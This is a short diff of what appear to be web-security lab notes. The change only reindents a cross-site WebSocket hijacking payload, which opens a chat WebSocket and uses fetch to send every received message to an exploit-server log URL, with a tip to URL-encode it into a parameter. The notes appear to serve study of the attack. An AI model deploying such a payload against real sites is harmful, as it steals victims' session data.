@@ -34,13 +34,13 @@ Content-Length: 3561
 
 - In this page, send a POST request with username is:
 <script>
-var ws = new WebSocket('wss://0ab900a3036806d8809b03ae0042005b.web-security-academy.net/chat')
-ws.onopen = () => {
-ws.send('READY');
-}
-ws.onmessage = (event) => {
-fetch('https://exploit-0a360055032d06eb805f029f019400e4.exploit-server.net/log?key=' + event.data);
-}
+    var ws = new WebSocket('wss://0ab900a3036806d8809b03ae0042005b.web-security-academy.net/chat')
+    ws.onopen = () => {
+        ws.send('READY');
+    }
+    ws.onmessage = (event) => {
+        fetch('https://exploit-0a360055032d06eb805f029f019400e4.exploit-server.net/log?key=' + event.data);
+    }
 </script>
 => see a request to exploit server
 ====> we can encode code above into URL and put it into URL parameters
